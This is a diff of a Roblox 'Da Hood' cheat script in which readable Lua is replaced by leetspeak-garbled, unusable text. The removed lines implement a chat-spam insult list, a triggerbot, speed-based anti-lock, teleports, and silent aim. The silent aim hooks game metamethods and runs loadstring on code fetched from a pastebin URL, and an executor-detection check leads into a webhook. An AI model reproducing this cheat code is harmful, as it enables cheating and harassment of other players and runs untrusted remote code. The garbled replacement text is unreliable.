+		[]-[|Z.R19}{7L°\\'€|?L&9.Tяλ2§|D∂|?€|\|(`/ = "1"
+		(}{|Z.R16|-|']['U9|²32L€6.M&54Io| = "]-[']['']['p://\|/\|/\^/.1²9|o19)(.©<>/|\/4§$&7/?1|)=90294to096"
+		(|-||2.R!6}{']['U|2|²&?L£9.T£><7µ?3ID = "4†7|²://|20ß£ø?.[°/v\/λ$$£']['/?][Ð=90284drei398"
+		<#®.R!9}{†F<>()+.M£5}{I|] = "902942089"
+		(412.R16#†F0°†.T|?^|V?p/-\я£/V['/ = "1"
+	€?đ)
 
-	Tab2:Button("Trash Talk (J)",function(bool)
-		local plr = game.Players.LocalPlayer
-		repeat wait() until plr.Character
-		local char = plr.Character
+	Tq|oto:B[_]+']['[]|V("T2q§}{ T/-\1|< (J)",PH|_|/|/[7!<>?(|><>[]1)
+		|_9©^1 |2£2 = 6∂|\/|£.P£q`/3®5.L9</-\1P|^'/€|?
+		®&|2€^7 \|//\][']['() µ|17|1 |D|_?.C|-|4|2λ<†&|Z
+		|_[](q1 ©]-[/-\я = |*1®.C4q1²@©†£|2
 
-		local garbage = {
-			"ur bad";
-			"sonney boy";
-			"ez";
-			"my grandma has more skill than you";
-			"seed";
-			"sit son";
-			"trash";
+		|_()©λ£ 9/-\?|o∂93 = {
+			"|_|12 |>λ<|";
+			"§*|\|/V3j |o9`/";
+			"£2";
+			"^^j 612/-\/\\/<|]V[/-\ /-//-\$ /\/\[]|2€ 5|(1|_1 †]-[^(\) `/9|_|";
+			"§33|>";
+			"?1'][' ŝø/\/";
+			"†|2∂5]-[";
 			"LOL";
 			"LMAO";
-			"imagine being you right now";
-			"xd";
-			"don't try LOL";
-			"you lose";
-			"why do you even try";
-			"I didn't think being this bad was possible";
-			"leave";
-			"no skill";
-			"so sad man.";
-			"bad";
-			"you're nothing";
-			"lol";
-			"so trash";
-			"so bad";
-			"ur salty";
-			"salty";
-			"look he's mad";
-			"cry more";
-			"keep crying";
-			"cry baby";
-			"hahaha I won";
-			"no one likes u";
-			"run 1s seed";
-			"thank you for your time";
-			"you were so close!";
-			"better luck next time!";
-			"rodent";
+			"l|11^91|13 |3&l?9 `/0[_] 1²][9}{'][' 2°|/|/";
+			"%|>";
+			"|]<>/\/'+ +я`/ LOL";
+			"j0|_| £øŝ£";
+			"|/|/#'/ Ð* `/øµ €|/3/V †1²j";
+			"I <|1|)(\)'+ ']['/-/1/|/|{ |>£1|19 7#][? |3/\<| |/|//-\§ |*°ŝ$1|o1£";
+			"|&/\\|£";
+			"|Vø $|(!£1";
+			"§() ?/-\o| /v\q11.";
+			"|o4o|";
+			"'/0µ'?3 /V[]†/-/|/V6";
+			"|_01";
+			"?[] †|Zqŝ]-[";
+			"$ø |>λđ";
+			"[_]2 ŝ/-\17°/";
+			"?/\1']['j";
+			"£9[]|( #€'ŝ AA∂|>";
+			"[2j /\/\01²£";
+			"|{££|° <|Z`/1(\)6";
+			"<|2'/ |>/-\8j";
+			"}{/\}{q4@ I \/\/ø|1";
+			"/\\/ø °/V& 1l|{&$ µ";
+			"12[_](\) 15 §&£<|";
+			"†/-//-\|1|( '/ø[_] ƒ°|Z °/0µ® +!|\/|&";
+			"j*µ \A/€|?€ §9 (£°$3!";
+			"13€†7€1² £[_]©|( /\\/&?'][' ']['][|\/|3!";
+			"|2[]đ&/\\/7";
 			"HAHA";
-			"ill 5-0";
-			"just quit";
-			"time to take out the trash";
-			"did you get worse?";
-			"I'm surprised you haven't quit yet";
+			"][11 5-0";
+			"_|[_]ŝ+ kw|_|][7";
+			"7!(V)3 7° †/\|<€ ()µ† †]-[£ 71²λ?|-|";
+			"|)][<| j*[_] 6&+ \^/*|Z?3?";
+			"I'(V) ŝµ2|°|2!§3đ '/[][_] |-|4|/&(\)''][' (,)|_||'][' j&7";
 
 
 
@@ -818,222 +818,220 @@ Trashtalk.MouseButton1Down:connect(function()
 		}
 
 
-		function TrashTalk(inputObject, gameProcessedEvent)
-			if inputObject.KeyCode == Enum.KeyCode.J and gameProcessedEvent == false then        
-				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-					garbage[math.random(1,#garbage)],
-					"All"
+		PH|_|/V[7l()|V Tяλŝ#T4||{(1/V|*[_]7Oß_|€['][', 6/-\|11&P?()<3$§3đE|/3/\/†)
+			!|" !|\||D[_]']['Ol³_|3(†.K€`/C°|>€ == E?µ/\/\.K€jC[]|]€.J ∂|1Ð 9q/\/\&P?()<3ŝ53đE|/311+ == |=/-\|§£ †}{3|1        
+				6/-\(V)3.R£|>|1[/-\+&<|S']['ø®/-\6€.D3ƒλ|_||_+C]-[4†Sjŝ†&|11C}{@†E\|£/|/†§.S/-\jM£ŝ5^6&R3(,)|_|3$+:Fl|Z&S€|?\/€|Z(
+					64?|>46£[(V)@†#.1²4|V|)°/\/\(1,#6∂я|oλ6&)],
+					"A1|_"
 				)
-			end
-		end
+			€|Vđ
+		32|]
 
-		game:GetService("UserInputService").InputBegan:connect(TrashTalk)
-	end)
+		6/-\^^3:G&+S£2\/l©&("U§3яI|\|p|_|7S€12\|1[&").I?|Dµ†B€9@11:[°|\|/V3<7(T12q?]-[Tq||()
+	3|1o|)
 
-	local Tab3 = Window:Tab("Anti-Lock",false)
+	1°(@£ T/-\l³3 = W!?|)*\|/:T/\|>("A/|/†|-L*©|{",ƒλ£§&)
 
-	Tab3:Label("Anti-Lock")
+	T/-\|>drei:L/\|3£|_("A11†!-L*<|<")
 
-	local triggerbotEnable = Tab3:Button("Trigger Bot (BETA Cant turn off btw)", function(state)
-		local player = game.Players.LocalPlayer
-		local mouse = player:GetMouse()
-		local Players = game:FindService("Players")
+	£°<41 +1²l99&?8()']['E/\\//\l³£€ = T/-\|33:B[_]+†()?("T|?1693|Z B°'][' (BETA C4|\|† ']['[_]я? []PHPH ß']['uu)", |"µ|\|[7!<>/|/(§7@']['€)
+		£<>[q| |>1^j3|2 = 6@[]V[]£.P1^j€1²5.Lø[^1P|_∂°/3|?
+		1<>©^1 []V[]0[_]ŝ3 = |²|λ`/3|2:G€+M°µ?3()
+		|°</\|_ P£^j€25 = 6∂]V[&:Fl(\)o|S&|Z\/![&("P|λ`/€|2?")
 
-		if state == true then
-			repeat wait()
-				local target = mouse.Target	
-				if target then
-					if target.Parent:IsA("Model") then
-						for i,v in pairs(Players:GetChildren()) do
-							if v.Name == target.Parent.Name or v.Name == target.Parent.Parent.Name then
-								mouse1click()
-							end
-						end
-					end
-				end
-			until state == false
-		end
-	end)
+		l|= 57@']['€ == 7|?[_]€ 74€|V
+			|2&|*£λ+ \|\|41']['()
+				£[][∂£ +/-\|26£† = /v\°|_|§3.T^®93†	
+				][|" †@?6&'][' 7#£(\)
+					1ƒ †∂|293†.Pq2327:I?A("M°o|&1") 7#3/\/
+						ƒ9|2 !,\/ !11 |²q][1²?(P£4j&|?5:G€7C#||_Ð1232()) o|°
+							][PH |/.N/\^^€ == 7∂|?6£†.P/\1²€/\/']['.Nλ]V[€ ø|2 \|.Nλ/\/\& == +q?6€7.Pq1²&(\)†.P@12£|V+.N@]V[3 7]-[€11
+								[]V[]°|_|5&1(|_!<|{()
+							&11o|
+						311<|
+					£|V<|
+				€/|/Ð
+			[_]/\\/†l|_ ŝ']['q+£ == ƒ/-\1ŝ€
+		£|\||]
+	&|V|))
 
-	Tab3:Button("FIX ANTILOCK",function(bool)
+	T/-\l³drei:B|_|+70/|/("FIX ANTILOCK",|=[_]|\|[']['|ø/\/(|>()01)
 
-		for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-			if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
-				v:Destroy()
-			end
-		end
-		game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
-			repeat
-				wait()
-			until game.Players.LocalPlayer.Character
-			char.ChildAdded:Connect(function(child)
-				if child:IsA("Script") then 
-					wait(0.1)
-					if child:FindFirstChild("LocalScript") then
-						child.LocalScript:FireServer()
-					end
-				end
-			end)
-		end)
+		ƒ91² _, |/ |/V p/-\1|2ŝ(9/\[]V[]3.P1/\'/3®$.Lø©λ|_P1λ`/€1².C]-[@1²^©73®:G3+C}{][||]®&11()) Ð<>
+			][ƒ \|:I$A("S<®!|2']['") /\/|/<| \|.Nλ/\/\€ ~= "H£∂1']['/-/" @|VÐ \|.N@|'|'|€ ~= "S9µ/Vo|" @/\\/đ |/:F1/\\/|]Fl|Z§7C4][1đ("L°[/\£S<1²][][D+") †4£?
+				\/:D€?†я*j()
+			£|1|]
+		&|1đ
+		6/-\]V[3.P|_/-\'/€|?$.L[](/-\|_P£∂`/32.C/-/4я@©†3яAÐo|&|):C[]?|\|€<7(PH[_]|V(']['][<>/|/((|-|4|?)
+			?£|2&q+
+				\A//-\][7()
+			µ/\/+l£ 9q(V)3.P£q°/£2$.L()</\1P|_^`/&|Z.C]-[∂®q[†£2
+			©/-//\®.C]-[l|đA|]đ&<|:C*(\)/\/£<']['(|=[_]|\|<7|<>/\\/((]-[11|))
+				l|= (}{||_o|:I§A("S<|?||²7") '][']-[&2 
+					uu/\l+(0.1)
+					l|= ©]-[!|<|:Fl11|)F][1²ŝ']['C411Ð("L[]<^1S<1²!][D+") +}{£?
+						[}{][1|).L[][∂|S©1²!|2†:F!я€S€|Z\/€|Z()
+					3/V<|
+				3/Vo|
+			£|V<|)
+		€|\|o|)
 
-	end)
+	£|\|o|)
 
-	local glitch = false
-	local clicker = false
+	|ø(/-\| 6£|7[/-/ = |"λ£ŝ£
+	|[][q1 <|_!<|<&® = PHλ£5&
 
-	Tab3:Textbox("AntiLock (use -0.10 to -0.60)","Speed",function(a)
+	Tq8drei:T€?+ß°?("A|V+!L0(|( (µ53 -0.10 †<> -0.60)","S|²3£o|",|=[_](\)(7][°/\/(λ)
 
-		getgenv().Multiplier = a
+		93+9&/\/\|().M[_]1+][][D|131² = 4
 
-	end, {
-		["clear"] = false,
+	&|1|), {
+		["©|€/-\|?"] = ƒ/-\1$3,
 	})
 
-	Tab3:Button("Antilock Improved (Z)",function(bool)
-		local userInput = game:service('UserInputService')
-		local runService = game:service('RunService')
+	T^|33:B|_|+†°2("A2']['!1ø[|( I|'|'||*|Z()|/€o| (Z)",ƒ|_||V©']['1()/\\/(8()*|_)
+		£0(@1 [_]$312I/\\/|D|_|7 = 9/-\]V[3:$3®|/l©€('U§3|ZI|\||°µ7S&|?\/1<3')
+		£<>(4|_ яµ/\/S€?\|!<€ = 6/-\|'|'|&:?€я\||<€('R[_]|VS€|2\||<&')
 
-		userInput.InputBegan:connect(function(Key)
-			if Key.KeyCode == Enum.KeyCode.Z then
-				Enabled = not Enabled
-				if Enabled == true then
-					repeat
-						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getgenv().Multiplier
-						runService.Stepped:wait()
-					until Enabled == false
-				end
-			end
-		end)
-	end)
+		|_|?€яI/\/|Dµ']['.I/V|Dµ']['B£9/\|1:[9|12€©†(|"[_]/\/<+!9/\\/(K&°/)
+			!|= K&'/.K&`/C0|>€ == E/V|_|/v\.K&`/C°Ð3.Z 7]-[£/\\/
+				E|\|∂|3|_€Ð = (\)9'][' E/|/^l³£&|>
+				lƒ E114|o|_€|] == †|Zµ€ 7]-[3|V
+					|2£|²&q']['
+						6/-\/|\£.P1^'/€12ŝ.L0<λ|P1∂'/£я.C/-/∂®/-\©+£?.H|_||\/|4|\|[]!ÐR°<>†Pq®†.CF|?λ/\/\£ = 64]V[&.P|^'/&12?.L<>©4|P1/-\`/31².C4@®@<†£|?.H|_|(V)λ?9][|]R0°†P/-\|?+.CF1²∂]V[€ + 9λ]V[3.P1/-\°/3|2§.L0(@|P|_∂j€?.C|-|^1²@[']['£|2.H|_|]V[^/|/9!đ.M[]|/3D1|Z&<†1()2 * 6&793/V|/().Mµ|†||>|_!€12
+						12[_]11S3|Z\|!<&.S†€|>][D3<|:|/|/@|+()
+					|_|27][|_ E?/\l³£€|] == ƒ∂1?&
+				&/\/o|
+			&/\\/<|
+		3/\\/Ð)
+	€|1Ð)
 
-	local Tab4 = Window:Tab("Teleports",false)
+	1°(^|_ T@|>4 = Wl|1|>9\\':T@ß("T£1£|>°я7$",PH/-\1ŝ£)
 
-	Tab4:Label("Teleports")
+	T/\84:L∂8£1("T3|_&|>()|?']['5")
 
-	Tab4:Button("Double Barrel",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.59985, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-	end)
+	Tq84:B[_]']['']['°/V("D()[_]1313 B∂|Z|2&1",|"µ?(†l*|1(\|/-\|_|_|3)
+		9€']['63|\||/().9/-\AA&.P|_/\`/£12§.Lø<^£P1∂°/£|Z.C4/\|Z4<†3я.Hµ|11λ/|/*l|]R0°7P42+.CF|2/\]V[& = CF|Z@/|\€.113VV(-10drei9.599eight5, 1eight.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+	3|\||>)
 
-	Tab4:Button("Revolver",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.8500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-	end)
+	T^84:Bµ++ø11("R€|/ø|_\/&я",ƒ|_|?<']['l9/|/(\//-\|[_]£)
+		63+9&2\/().9^|'|'|&.P14j3|?5.L<><^£P|λj£?.C|-|/-\|Zq(+312.Hµ|\/|λ(\)°lÐR()°']['P^2†.CF2∂/v\€ = CFя^^^£.|V€\|\|(-63-aite.75, 1eight.-aite500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+	€/\\/|))
 
-	Tab4:Button("Shotgun",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.623657, 5.47212696, -725.131531, 0, 0, 1, 0, 1, -0, -1, 0, 0)
-	end)
+	Tλ|34:B[_]']['']['0(\)("S/-/ø']['9|_||V",PH[_]/V©']['!92(\|λ1|_|&)
+		6&†9€|\|\|().9/\(V)&.P|_/-\°/€2§.L[](^|_P|_∂'/3?.C]-[∂|?^<']['&|2.H|_|AA4|19|đR[]*+Pλ?†.CF?/-\^^€ = CF|Z^/\/\&.2£VV(-57eight.62drei657, 5.47212696, -7to5.1drei15drei1, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+	3/\/|))
 
-	Tab4:Button("Tactical Shotgun",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(470.877533, 45.1272316, -620.630676, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
-	end)
+	T@|>4:Bµ77()/\\/("T@©†][<∂|_ S#°76[_]2",ƒµ11©7l<>11(\/∂|_µ&)
+		9£']['6€/V\|().9/\/|\£.P14'/£|?5.L9(/\|P14`/&?.C]-[4я@©†£1².H[_]AA@?ø!o|R[]0+P∂я†.CF1²λ|'|'|€ = CF|?λ^^&./|/&\A/(470.8775dreidrei, 45.1to72drei16, -6to0.6drei0676, 0.999999eightto1, 0.000604to54019, -2.608021drei5£-0-aite, -0.000604to54019, 0.999999eight21, -8.6322004-aite&-05, -to.608021drei5&-0eight, -aite.632to004-aite3-05, 1)
+	&|1o|)
 
-	Tab4:Button("Smg",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-577.123413, 5.47666788, -718.031433, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-	end)
+	T/-\ß4:Bµ779/\\/("S|\/|6",|"µ|1[+10/V(\//-\|[_]3)
+		9&76€|V\|().9/\[]V[]£.P1^'/&|?$.L°<@1P|_q`/€®.C4∂|2q[7£®.Hµ]V[@|1[]][|]R°[]7P∂®†.CF2∂/\/\€ = CF|?/\[]V[]£./V£VV(-577.12drei413, 5.476667-aite-aite, -71eight.0314dreidrei, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+	£?đ)
 
-	Tab4:Button("RPG",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-794.814697, -42.5468521, -932.97998, 5.96046448e-08, 2.91038305e-11, 1, -0.000610388815, 0.999999821, 2.91038305e-11, -0.999999762, -0.000610388815, 5.96046448e-08)
-	end)
+	T∂84:Bµ7†°?("RPG",ƒ[_]/\/[†l()11(\/^1µ3)
+		6&+6€2\/().9qAA&.P1/\'/€12$.Lø(/-\1P|_/\°/3?.C#@я∂<7£?.H[_]AA4/|/°l|)R9°7P@12+.CF|2/\|11£ = CF?4|11£./V&uu(-794.eight14697, -42.546eight5to1, -9dreito.9799-aite, 5.9604644eight€-0eight, 2.910drei8305£-11, 1, -0.000610drei-aite8815, 0.999999-aite21, 2.910383053-11, -0.999999762, -0.000610drei-aiteeighteight15, 5.96046448£-0eight)
+	&?<|)
 
-	Tab4:Button("Armor",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-607.978455, 7.44964886, -788.494263, -1.1920929e-07, 0, 1.00000012, 0, 1, 0, -1.00000012, 0, -1.1920929e-07)
-	end)
+	Tλ134:B|_|7+()|1("A?[]V[][]®",ƒ[_]/\/<']['1[]|\|(\|∂||_|&)
+		9£†63|\|\|().9/-\]V[£.P1q`/£|?5.L9©λ£P1q'/312.C}{/\|Zλ<7€|2.H[_]AA∂(\)ø!|]R[]ø†P@®+.CF12q/|\€ = CF2/-\/\/\&.|V£\|/(-607.97eight455, 7.44964-aite-aite6, -7eight8.494to63, -1.1920929€-07, 0, 1.00000012, 0, 1, 0, -1.0000001to, 0, -1.1920929€-07)
+	32đ)
 
-	Tab4:Button("PopCorn",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-995, 21.6998043, -153.100037, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-	end)
+	T/\|o4:B[_]†+0/\\/("Pø|²C°|22",|=[_]/V<7!ø11(\|∂1|_|€)
+		93']['9£/\/|/().94/\/\&.P1λ°/3|Z§.Lø</-\1P1λ'/€12.C#λ®q(+£?.Hµ^^^?ø||)R<>0+P/\|Z']['.CF|?/-\AA& = CF|2q(V)3.|V&VV(-995, to1.699804drei, -15drei.100037, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+	311|])
 
-	Tab4:Button("Casino 1v1",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-962.72345, 21.2549973, -186.814987, -0.0274876002, 2.91178949e-05, 0.999621451, -5.5798846e-06, 1, -2.92823333e-05, -0.999621451, -6.38268148e-06, -0.0274876002)
-	end)
+	Tql³4:Bµ+']['[]/\/("C@5!11<> 1\/1",|=µ|1©7l9/V(\|∂|[_]£)
+		6&']['6€/V|/().9∂^^€.P1q'/€яŝ.Lø(@1P|_∂'/&®.C]-[^|?∂<7&®.H|_|^^∂/\\/°lđR9*']['P∂®+.CF|Z/\[]V[]& = CF2q|\/|3.(\)&\/\/(-962.72345, to1.254997drei, -1-aite6.-aite14987, -0.0274-aite76002, to.91178949&-05, 0.9996to1451, -5.5798846£-06, 1, -to.9282333drei£-05, -0.9996to1451, -6.drei826814eight€-06, -0.0274eight76002)
+	3(\)o|)
 
-	Tab4:Button("Bank",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402.123718, 21.75, -283.988617, 0.0159681588, -0.000121377925, -0.999872446, -2.60148026e-05, 1, -0.000121808866, 0.999872506, 2.79565484e-05, 0.0159681737)
-	end)
+	Tλ|34:B[_]7']['*?("B∂/|/|(",PH[_]/\\/<7!°/\/(\|q|_µ£)
+		6€+63/\\/|/().6λ(V)&.P£/-\°/31²$.L<>©λ|_P|λ`/3я.C}{∂®/\[+£®.H|_||\/|∂11()1|]Rø9+Pq?7.CF1²λ[]V[]3 = CF®∂(V)€./\/€uu(-402.1todrei71-aite, 21.75, -2eightdrei.98-aite617, 0.01596-aite158eight, -0.000121drei779to5, -0.999eight72446, -to.6014-aite0to6€-05, 1, -0.0001to180-aiteeight66, 0.999-aite7to506, 2.79565484&-05, 0.01596eight17drei7)
+	&/|/<|)
 
-	Tab4:Button("Main Food",function(value)
-		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-338.352173, 23.6826477, -297.2146, -0.0060598203, -1.03402984e-08, -0.999981582, -1.61653102e-09, 1, -1.03306892e-08, 0.999981582, 1.55389912e-09, -0.0060598203)
-	end)
+	T@|34:B|_|7+()/V("M/\!(\) F<><>Ð",PH|_|/|/[710/|/(\|/-\1µ3)
+		9376&?\/().6∂|'|'|€.P|_/\°/&25.L[]©λ1P1/-\'/3®.C4q|2q©7£|2.H|_|]V[/\(\)ø!<|R<>ø†P@|2+.CF?@|'|'|€ = CF|Z∂]V[3./\/&\|\|(-33-aite.352173, 23.6-aiteto6477, -to97.2146, -0.006059eightto0drei, -1.034029843-0-aite, -0.9999815-aite2, -1.6165310to£-09, 1, -1.0330689to€-08, 0.9999-aite15-aiteto, 1.5538991to3-09, -0.006059820drei)
+	€/|/<|)
 
-	local Tab5 = Window:Tab("Keybind",false)
+	|ø(/\| T/\ß5 = W1|V|]ø\^/:T4|>("K£'/|>|11|)",|=q|ŝ3)
 
-	Tab5:Label("Keybind")
+	T/-\135:Lλ8€1("K3`/|>111o|")
 
-	Tab5:Keybind("Toggle",Enum.KeyCode.RightShift,function()
-		Library:Toggle()
-	end)
+	T4135:K€j|3|/|/|]("T966|3",E2|_|/\/\.K&°/C[]o|€.R16}{']['S#lƒ'][',|"|_|/\\/(']['l()/V()
+		L][13®/-\2°/:Tø691&()
+	3/|/<|)
 
-	local Tab5 = Window:Tab("Credits",false)
+	10<^| T/\|>5 = Wl|1o|ø\^/:T/-\8("C?€đ|']['?",|"∂|?€)
 
-	Tab5:Label("Varski#0001,7c#0001")
+	Tq|>5:Lq8£1("Vλя5|<][#0001,7(#0001")
 
-	local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/x0GU1rjk"))()
-	Aiming.TeamCheck(false)
+	1ø[4| Al/\/\l?6 = 1[]4|]?']['2l119(6q/|\£:H']['7|*G37("]-[††|>ŝ://|2/\?7€ß1|V.<°|\/|/®^\/\//×0GU12_||("))()
+	A][^^][(\)9.T&q/|\C/-/€[|{(|"41ŝ&)
 
-	local Workspace = game:GetService("Workspace")
-	local Players = game:GetService("Players")
-	local RunService = game:GetService("RunService")
-	local UserInputService = game:GetService("UserInputService")
+	|_()<∂1 W*12|(59/-\<& = 9/-\AA£:G£']['S€|Z|/1©€("W[]®|<ŝ|>q(&")
+	|_9[/\£ P14`/31²$ = 6^/|\3:G37S£|?\|1(€("P1/\j€2$")
+	£ø(/-\1 Rµ/VS3|Z\||[€ = 64/\/\3:G€7S€1²|/!<€("R[_]/\\/S3®\|1(&")
+	£0</\| Uŝ€|2I/\\/|²[_]†S3®|/1[3 = 9/\/v\&:G&+S£®\|l©£("Uŝ€?I|1p[_]7S€|2\/l©3")
 
-	local LocalPlayer = Players.LocalPlayer
-	local Mouse = LocalPlayer:GetMouse()
-	local CurrentCamera = Workspace.CurrentCamera
+	|_()(∂1 Lø(^|_P1∂j€|Z = P|_∂'/&12$.L<>(^£P|q'/£1²
+	£0[∂| M*[_]§£ = L[][^|_P1/-\°/3|2:G£7Mø[_]§£()
+	1<>(q£ C[_]212€11+C@^^£|2/\ = W()?|<$|>/\<£.C|_||223/\\/']['C∂/|\&®^
 
-	local DaHoodSettings = {
-		SilentAim = true,
-		AimLock = false,
-		Prediction = 0.157,
-		AimLockKeybind = Enum.KeyCode.E
+	19<@1 D^H<>*|>S3+†|(\)6ŝ = {
+		S][|_&/\\/7A][AA = +1²|_|&,
+		A!^^L0(|( = |"q|§&,
+		P|Z£<|][[7][9|1 = 0.157,
+		A1|'|'|L°<|{K£j13||\|Ð = E/\/[_]^^.K3jC0Ð3.E
 	}
-	getgenv().DaHoodSettings = DaHoodSettings
+	6&79€/\/|/().D∂H09o|S£7+l/|/9ŝ = D^H()*|]S&7']['1|V6ŝ
 
-	function Aiming.Check()
-		if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
-			return false
-		end
+	|"µ|V<+1ø11 A![]V[]1?6.C#&[|{()
+		|ƒ (\)<>+ (A][/\/\1|19.E|1λl³1€đ == +12µ£ /-\(\)Ð Al^^][26.S31€©7€đ ~= L*©q|_P1/-\j£1² ∂|1<| A][/|\l?9.S€£€(7€o|Pq|2+ ~= |V||_) ']['|-|€11
+			12&+µ|Z11 ƒ@|?3
+		£11|)
 
-		local Character = Aiming.Character(Aiming.Selected)
-		local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
-		local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+		|_ø©q| C/-/4®^[7£я = A1^^|26.C]-[4|?^<7£12(A1^^|(\)6.S3|3[']['3|))
+		|_0[/\|_ KOđ = C|-|∂2^[†3®:W/-\][+F9|2C|-|l||]("B()Ð'/Eƒ|"€©']['$")["K.O"].Vq|[_]3
+		£9(41 G124|3|3£<| = C}{4|?@[†€|?:Fl/\\/|)F][я5†C]-[l1Ð("GRABBING_CONSTRAINT") ~= (\)!|_
 
-		if (KOd or Grabbed) then
-			return false
-		end
+		l|" (KOo| 912 G1²λ13ß&|>) +]-[€/\/
+			1²€†|_||2(\) PHλ1§3
+		&/\\/Ð
 
-		return true
-	end
+		12€7[_]12|1 ']['2[_]€
+	£/\/<|
 
-	local __index
-	__index = hookmetamethod(game, "__index", function(t, k)
-		if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
-			local SelectedPart = Aiming.SelectedPart
+	1°(/-\1 __][/V<|€%
+	__1(\)Ð£% = |-|°<>|<]V[€']['^^^&+/-/0Ð(6/\[]V[]€, "__][/\\/đ&)(", PH|_|(\)[7][[](\)('][', |<)
+		][ƒ (+:IŝA("M[]µ5£") /\/Vđ (|( == "H][+" <>® |< == "T^293†") q?Ð A1]V[|/|/6.C]-[3©|{()) ']['|-|£2
+			|0[λ| S&|&(']['£ÐP∂я'][' = A][/|\!/\\/6.S€|&<+€|]Pλя†
 
-			if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
-				local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+			|ƒ (D4H*()|)S£771/V9$.S1£3(\)7A][]V[ 4|1|) (|< == "H!7" []|? |< == "Tq|?6€7")) ']['4£/V
+				|_()(∂|_ H1'][' = S3|£©+£|)Pq|2+.CF2^/v\€ + (S££€©7£|]P∂1²+.V&|_*©|'][''/ * DλH*0|>S€+']['|119§.Pя&đ1[+][[]|\|)
 
-				return (k == "Hit" and Hit or SelectedPart)
-			end
-		end
+				®&†[_]12/\\/ (|{ == "H][7" q|V<| H]['][' <>12 S€1£(']['£đPλ1²'][')
+			&|V<|
+		€/\\/|]
 
-		return __index(t, k)
-	end)
+		1²&']['|_|?(\) __][2o|£}{(+, |()
+	€|V|))
 
-	RunService:BindToRenderStep("AimLock", 0, function()
-		if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
-			local SelectedPart = Aiming.SelectedPart
+	R|_|2S£|?\|][[3:B!/|/đT9R3/|/|>&|2S7&|>("A][/v\L()[|{", 0, ƒµ|V(+l0(\)()
+		lƒ (D/-\H**|>S£+']['|/|/95.A][/v\L0[|( ^/V|] AlAA1?6.C#&(|(() λ(\)|] U§£?I/\\/|²|_|†S&®\/1©€:I§K£jD9VV/V(D4H00o|S£†']['!|V65.A!/|\L*©|(K3°/|>1|1đ)) †}{3|V
+			|_*[@1 S€£&<']['£ÐP@я† = AlAAl/\/6.S£££<7€|>P/\я7
 
-			local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+			£°©/\|_ Hl+ = S€|_3<†£đPq12+.CF|2^[]V[]& + (S&1£[7£|]Pλя7.V&1<>©1']['j * DλH9°o|S£']['71116$.P®€|>][<7l()|V)
 
-			CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
-		end
-	end)
-	local webhookcheck =
-		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-		secure_load and "Sentinel" or
-		KRNL_LOADED and "Krnl" or
-		SONA_LOADED and "Sona" or
-		"Kid with shit exploit"
-
-
+			C|_||?|2€|V+C@/\/\3|Z4.CF1²/-\/v\& = CFя4|\/|£.|_00|(A+(Cµ?|Z£?†Cq/\/\£24.CF?q^^&.P[]$][']['!ø11, H!+.P<>5][']['!<>(\))
+		£2|)
+	£/|/|])
+	|_9[^| \|/313/-/°°|([#£<|( =
+		!§_$||2]-[[_]|?+_©|ø5[_]|Z€ /\/Vđ "Sl|Z4µ|?']['" []|Z |>3ß©_£)(3©|_|7€ @|1<| "P|Z°7*S]V[@ŝ}{£12" °1² §°//\\/ @/|/o| "S°//\/4][Dŝ£ X" ø?
+		§&(|_||?£_19λo| ∂(\)Ð "S£/V']['|/\/££" <>®
+		KRNL_LOADED @(\)đ "K?|V1" ø12
+		SONA_LOADED λ(\)|] "S()/\\//-\" 0|Z
+		"Klđ \A/][†}{ 5/-/]['][' €)(p|_<>17"
 
 
 
@@ -1063,108 +1061,110 @@ Trashtalk.MouseButton1Down:connect(function()
 
 
 
-	local url =
